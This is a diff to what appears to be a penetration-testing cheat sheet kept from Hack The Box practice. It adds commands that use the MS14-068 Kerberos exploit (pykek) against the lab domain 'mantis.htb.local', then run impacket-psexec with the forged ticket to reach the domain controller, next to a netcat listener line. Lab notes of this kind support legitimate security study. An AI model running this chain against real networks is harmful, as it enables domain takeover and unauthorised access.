@@ -115,7 +115,11 @@ nc -nlvp 445
 ### Abusing MS14-068 to domain admin
 ```
 https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek  
-ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr>
+ms14-068.py -u <userName>@<domainName> -s <userSid> -d mantis.htb.local --rc4 ntlm_hash
+
+It will generate ccache file
+export KRB5CCNAME=/path/to/ccache
+impacket-psexec -k -no-pass htb.local/james@mantis.htb.local(dc-hostname) -dc-ip dc-ip
 ```
 ### Enumerating DNS Records
 ```
